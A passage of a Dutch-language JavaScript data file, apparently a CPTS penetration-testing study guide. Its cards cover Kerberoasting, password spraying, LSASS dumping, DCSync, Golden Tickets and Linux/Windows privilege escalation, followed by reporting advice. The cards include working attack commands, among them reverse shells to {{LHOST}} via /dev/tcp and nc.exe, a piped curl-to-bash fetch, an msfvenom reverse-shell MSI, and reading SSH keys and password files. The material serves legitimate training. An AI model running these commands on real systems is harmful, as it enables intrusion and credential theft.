        d: 'Markeer je account als "Owned", gebruik de queries "Shortest paths to Domain Admins" en "Kerberoastable users". Let op ACL-edges (GenericAll, WriteDacl, GenericWrite).' },
    ]},
    { title: '3 · Kerberos-aanvallen', intro: 'Kerberos-tickets bevatten kraakbare hashes. Twee klassiekers die je op elke AD-box probeert.', items: [
      { h: 'Kerberoasting', tags: ['ad', 'kerberos', 'must-know'],
        d: 'Vraag service-tickets (TGS) op voor accounts met een SPN; kraak ze offline (hashcat mode 13100). Levert vaak een service-account met hoge rechten.',
        code: `impacket-GetUserSPNs -request -dc-ip {{IP}} {{DOMAIN}}/{{USER}}:'{{PASS}}'\nnetexec ldap {{IP}} -u {{USER}} -p '{{PASS}}' --kerberoasting kerb.txt\nhashcat -m 13100 kerb.txt {{WORDLIST}}` },
      { h: 'AS-REP Roasting', tags: ['ad', 'kerberos', 'must-know'],
        d: 'Accounts met "Kerberos pre-auth niet vereist" leveren een kraakbare hash zonder dat je hun wachtwoord kent (hashcat mode 18200).',
        code: `impacket-GetNPUsers -dc-ip {{IP}} -request -usersfile users.txt {{DOMAIN}}/\nnetexec ldap {{IP}} -u {{USER}} -p '{{PASS}}' --asreproast asrep.txt\nhashcat -m 18200 asrep.txt {{WORDLIST}}` },
      { h: 'Pass-the-Ticket / overpass-the-hash', tags: ['ad', 'kerberos'],
        d: 'Met een NTLM-hash of AES-key vraag je een TGT aan en authenticeer je als de gebruiker zonder wachtwoord.',
        code: `impacket-getTGT {{DOMAIN}}/{{USER}} -hashes :<NTLM>\nexport KRB5CCNAME={{USER}}.ccache\nnetexec smb {{IP}} --use-kcache` },
    ]},
    { title: '4 · Credential access & spraying', items: [
      { h: 'Password spraying', tags: ['ad', 'spray', 'must-know'],
        d: 'Eén waarschijnlijk wachtwoord tegen alle gebruikers — respecteert lockout-policy (check <code>--pass-pol</code> eerst).',
        code: `netexec smb {{IP}} -u users.txt -p 'Welkom2026!' --continue-on-success\nkerbrute passwordspray -d {{DOMAIN}} users.txt 'Welkom2026!' --dc {{IP}}` },
      { h: 'LSASS / SAM dumpen (lokaal admin)', tags: ['ad', 'creds'],
        d: 'Met lokale admin op een host: dump credentials in het geheugen en lokale hashes.',
        code: `netexec smb {{IP}} -u {{USER}} -p '{{PASS}}' --lsa --sam\nimpacket-secretsdump {{DOMAIN}}/{{USER}}:'{{PASS}}'@{{IP}}` },
    ]},
    { title: '5 · Lateral movement & domain compromise', intro: 'Met nieuwe credentials beweeg je zijwaarts tot je een pad naar de DC hebt. Eindstation: DCSync of Golden Ticket.', items: [
      { h: 'Uitvoeren op remote hosts', tags: ['ad', 'lateral', 'must-know'],
        d: 'psexec/wmiexec/evil-winrm — met domein-credentials of pass-the-hash.',
        code: `impacket-wmiexec {{DOMAIN}}/{{USER}}:'{{PASS}}'@{{IP}}\nevil-winrm -i {{IP}} -u {{USER}} -H <NTLM>\nnetexec smb targets.txt -u {{USER}} -p '{{PASS}}' -x whoami` },
      { h: 'DCSync (dump alle hashes)', tags: ['ad', 'dcsync', 'must-know'],
        d: 'Met replicatie-rechten (DA of specifieke ACL) repliceer je het wachtwoord van elke gebruiker — inclusief <code>krbtgt</code>.',
        code: `impacket-secretsdump {{DOMAIN}}/{{USER}}:'{{PASS}}'@{{IP}} -just-dc\nnetexec smb {{IP}} -u {{USER}} -p '{{PASS}}' -M ntdsutil` },
      { h: 'Golden Ticket', tags: ['ad', 'persistence'],
        d: 'Met de krbtgt-hash vervals je een TGT voor élke gebruiker/rechten — volledige, persistente domeincontrole.',
        code: `impacket-ticketer -nthash <krbtgt-hash> -domain-sid <SID> -domain {{DOMAIN}} Administrator` },
    ]}
  ]
},
/* ══════════════════════════════════════════════════════════════
   LINUX PRIVILEGE ESCALATION
══════════════════════════════════════════════════════════════ */
{
  id: 'linpe', cat: 'Privilege Escalation', icon: 'linpe', name: 'Linux Privilege Escalation',
  desc: 'Van user naar root: sudo, SUID, cron, capabilities, kernel en misconfiguraties.',
  tier: 'Tier II', diff: 'Medium', done: false,
  intro: 'Na je eerste shell ben je zelden meteen root. Privilege escalation zoekt de misconfiguratie of kwetsbaarheid die je naar root brengt. De aanpak is <b>altijd</b>: eerst grondig enumereren (handmatig + linpeas), dan de kansrijkste vector kiezen. Check <b>GTFOBins</b> voor elke binary die je met verhoogde rechten kunt draaien (sudo, SUID, capability) — dat is de snelste win.',
  groups: [
    { title: 'Enumeratie', intro: 'Begin altijd hier. 90% van de privescs volgt direct uit goede enumeratie.', items: [
      { h: 'Snelle handmatige checks', tags: ['linpe', 'enum', 'must-know'],
        code: `id; sudo -l\nuname -a\ncat /etc/crontab; ls -la /etc/cron.*\nfind / -perm -4000 -type f 2>/dev/null    # SUID-binaries\ngetcap -r / 2>/dev/null                     # capabilities` },
      { h: 'Automatisch (linpeas)', tags: ['linpe', 'enum', 'must-know'],
        d: 'Kleurt kansrijke vectoren rood/geel. Draai vanaf geheugen om sporen te beperken.',
        code: `curl http://{{LHOST}}/linpeas.sh | bash\n# of pspy voor draaiende processen/crons zonder root:\n./pspy64` },
    ]},
    { title: 'sudo & SUID', intro: 'De meest voorkomende vectoren. Zoek elke gevonden binary op GTFOBins.', items: [
      { h: 'sudo -l misbruiken', tags: ['linpe', 'sudo', 'must-know'],
        d: 'Mag je een binary als root draaien? GTFOBins geeft de exacte escape. Voorbeeld met een paar klassiekers:',
        code: `sudo -l\n# GTFOBins-escapes (indien toegestaan als root):\nsudo vim -c ':!/bin/sh'\nsudo find . -exec /bin/sh \\; -quit\nsudo less /etc/profile   # dan: !/bin/sh` },
      { h: 'SUID-binaries', tags: ['linpe', 'suid'],
        d: 'Een SUID-binary draait als de eigenaar (vaak root). Vind ze en check GTFOBins voor een shell-escape.',
        code: `find / -perm -4000 -type f 2>/dev/null\n# bv. als /usr/bin/find SUID is:\nfind . -exec /bin/sh -p \\; -quit` },
      { h: 'sudo CVE (Baron Samedit e.d.)', tags: ['linpe', 'cve'],
        d: 'Oude sudo-versies zijn kwetsbaar voor lokale root-exploits (CVE-2021-3156). Check <code>sudo --version</code>.' },
    ]},
    { title: 'Cron, PATH & capabilities', items: [
      { h: 'Schrijfbare cron-scripts', tags: ['linpe', 'cron'],
        d: 'Draait er een root-cron dat een script aanroept dat jij mag schrijven? Zet er je reverse shell in.',
        code: `cat /etc/crontab\nls -la /path/naar/script.sh\necho 'bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1' >> /path/naar/script.sh` },
      { h: 'Capabilities', tags: ['linpe', 'capabilities'],
        d: '<code>cap_setuid</code> op bv. python = directe root. Zoek op GTFOBins onder "Capabilities".',
        code: `getcap -r / 2>/dev/null\n# bv. python met cap_setuid:\n./python -c 'import os; os.setuid(0); os.system("/bin/sh")'` },
      { h: 'PATH hijacking', tags: ['linpe', 'path'],
        d: 'Roept een SUID-programma een binary zonder absoluut pad aan? Plaats je eigen versie vooraan in PATH.',
        code: `export PATH=/tmp:$PATH\necho -e '#!/bin/bash\\n/bin/bash' > /tmp/<binarynaam>; chmod +x /tmp/<binarynaam>` },
    ]},
    { title: 'Overig', items: [
      { h: 'Kernel exploits', tags: ['linpe', 'kernel'],
        d: 'Laatste redmiddel — kan de host crashen. Match <code>uname -r</code> tegen bekende exploits (DirtyPipe, DirtyCow, PwnKit).',
        code: `uname -r\nsearchsploit linux kernel <versie>\n# PwnKit (polkit CVE-2021-4034) werkt op veel distros` },
      { h: 'Gevoelige bestanden & creds', tags: ['linpe', 'loot'],
        code: `cat /home/*/.bash_history /home/*/.ssh/id_rsa 2>/dev/null\ngrep -rE 'password|secret' /etc /var/www 2>/dev/null\n# schrijfbaar /etc/passwd? voeg root-user toe:\nopenssl passwd -1 -salt x pass   # hash in /etc/passwd plakken` },
    ]}
  ]
},

/* ══════════════════════════════════════════════════════════════
   WINDOWS PRIVILEGE ESCALATION
══════════════════════════════════════════════════════════════ */
{
  id: 'winpe', cat: 'Privilege Escalation', icon: 'winpe', name: 'Windows Privilege Escalation',
  desc: 'Van user naar SYSTEM: token privileges, services, registry, AlwaysInstallElevated.',
  tier: 'Tier II', diff: 'Medium', done: false,
  intro: 'Windows-privesc draait om <b>tokens, services en misconfiguraties</b>. Enumereer eerst met winPEAS of handmatig, let vooral op je <b>privileges</b> (<code>whoami /priv</code>) — <code>SeImpersonate</code> en <code>SeAssignPrimaryToken</code> geven via de "Potato"-familie bijna gegarandeerd SYSTEM op servers. Daarna: zwakke service-permissies, unquoted paths en credentials in het register/bestanden.',
  groups: [
    { title: 'Enumeratie', items: [
      { h: 'Situatie bepalen', tags: ['winpe', 'enum', 'must-know'],
        code: `whoami /priv\nwhoami /groups\nsysteminfo\nnet user; net localgroup administrators` },
      { h: 'Automatisch (winPEAS)', tags: ['winpe', 'enum', 'must-know'],
        code: `.\\winPEASx64.exe\n# of PowerShell:\n. .\\PowerUp.ps1; Invoke-AllChecks` },
    ]},
    { title: 'Token privileges (Potato-familie)', intro: 'Op servers met <code>SeImpersonatePrivilege</code> (IIS, MSSQL-accounts) is dit de betrouwbaarste weg naar SYSTEM.', items: [
      { h: 'SeImpersonate → SYSTEM', tags: ['winpe', 'token', 'must-know'],
        d: 'PrintSpoofer/GodPotato/JuicyPotatoNG misbruiken impersonation om als SYSTEM te draaien.',
        code: `.\\PrintSpoofer64.exe -i -c cmd\n.\\GodPotato.exe -cmd "cmd /c whoami"\n.\\GodPotato.exe -cmd "nc.exe {{LHOST}} {{LPORT}} -e cmd"` },
    ]},
    { title: 'Services & scheduled tasks', items: [
      { h: 'Zwakke service-permissies', tags: ['winpe', 'service'],
        d: 'Mag je een service-binary vervangen of de config aanpassen? Wijs hem naar je payload en herstart de service.',
        code: `# met PowerUp:\nInvoke-AllChecks\n# service binpath kapen:\nsc.exe config <svc> binPath= "C:\\Windows\\Temp\\rev.exe"\nsc.exe stop <svc> && sc.exe start <svc>` },
      { h: 'Unquoted service path', tags: ['winpe', 'service'],
        d: 'Een pad met spaties zonder quotes laat Windows tussenliggende .exe\'s proberen. Plaats je payload op zo\'n plek.',
        code: `wmic service get name,pathname,startmode | findstr /i /v "C:\\Windows" | findstr /i /v '"'` },
    ]},
    { title: 'Registry & bestanden', items: [
      { h: 'AlwaysInstallElevated', tags: ['winpe', 'registry'],
        d: 'Staan beide keys op 1? Dan draait elke MSI als SYSTEM. Genereer een MSI met msfvenom en installeer.',
        code: `reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n# msfvenom -p windows/x64/shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f msi -o s.msi\nmsiexec /quiet /qn /i s.msi` },
      { h: 'Opgeslagen credentials', tags: ['winpe', 'loot', 'must-know'],
        code: `cmdkey /list\nreg query HKLM /f password /t REG_SZ /s\nfindstr /si password *.xml *.ini *.txt *.config\n# runas met gevonden creds:\nrunas /user:administrator cmd` },
    ]}
  ]
},
/* ══════════════════════════════════════════════════════════════
   DOCUMENTATION & REPORTING
══════════════════════════════════════════════════════════════ */
{
  id: 'report', cat: 'Afronding', icon: 'report', name: 'Documentation & Reporting',
  desc: 'Het examen wordt gewonnen in het rapport — structuur, bewijs en herstel.',
  tier: 'Tier II', diff: 'Medium', done: false,
  intro: 'Het CPTS-examen beoordeelt niet alleen of je root krijgt, maar of je een <b>professioneel rapport</b> kunt leveren dat de opdrachtgever begrijpt en kan gebruiken. Je faalt met alle flags als je rapport ondermaats is. Documenteer daarom vanaf minuut één: elk commando, elke screenshot, elke credential. Een goede bevinding beschrijft <b>wat</b>, <b>waar</b>, <b>impact</b>, <b>reproductie</b> en <b>herstel</b> — herhaalbaar door een derde.',
  groups: [
    { title: 'Tijdens de test', items: [
      { h: 'Alles vastleggen', tags: ['report', 'must-know'],
        d: 'Screenshot elke succesvolle stap mét het commando in beeld. Bewaar output per host. Je reconstrueert het achteraf nooit prettig.',
        code: `script -a ~/engagement-$(date +%F).log\n# per host een map met scans/loot/notes (zie Pentest Process)` },
      { h: 'Bevinding-template', tags: ['report'],
        d: 'Houd per kwetsbaarheid dezelfde structuur aan — dat maakt het schrijven van het rapport later mechanisch.',
        note: { type: 'info', text: '<b>Titel</b> · <b>Severity</b> (CVSS) · <b>Affected host/URL</b> · <b>Beschrijving</b> · <b>Impact</b> · <b>Reproductiestappen</b> (met bewijs) · <b>Aanbeveling/remediation</b> · <b>Referenties</b> (CVE/CWE).' } },
    ]},
    { title: 'Het rapport', intro: 'Een CPTS-rapport heeft een vaste opbouw. Schrijf voor twee doelgroepen: management (executive summary) en techniek (findings).', items: [
      { h: 'Vaste secties', tags: ['report', 'structure', 'must-know'],
        d: 'Deze structuur wordt in het examen verwacht.',
        note: { type: 'info', text: '<b>1.</b> Executive Summary (niet-technisch, business-impact) · <b>2.</b> Scope &amp; methodologie · <b>3.</b> Findings (per severity, met bewijs) · <b>4.</b> Attack narrative / path (chronologisch verhaal van compromise) · <b>5.</b> Remediation summary · <b>6.</b> Appendices (tooloutput, gekraakte hashes).' } },
      { h: 'Severity classificeren', tags: ['report'],
        d: 'Gebruik CVSS consistent, maar vertaal naar business-taal in de executive summary. Prioriteer op reële impact voor déze organisatie.' },
      { h: 'Herstel dat bruikbaar is', tags: ['report'],
        d: 'Schrijf concrete, actiegerichte aanbevelingen ("patch naar versie X", "verwijder SPN van dit account", "forceer SMB-signing") — niet vaag ("verbeter security").' },
    ]},
    { title: 'Na de test', items: [
      { h: 'Opruimen (cleanup)', tags: ['report'],
        d: 'Verwijder geüploade tools, web shells, aangemaakte accounts en persistence. Documenteer wat je hebt aangeraakt zodat de klant het kan verifiëren.' },
      { h: 'Retest', tags: ['report'],
        d: 'Na remediation verifieer je of bevindingen echt zijn opgelost, en update je het rapport met de status per bevinding.' },
    ]}
  ]
},
/* __MORE__ */
];
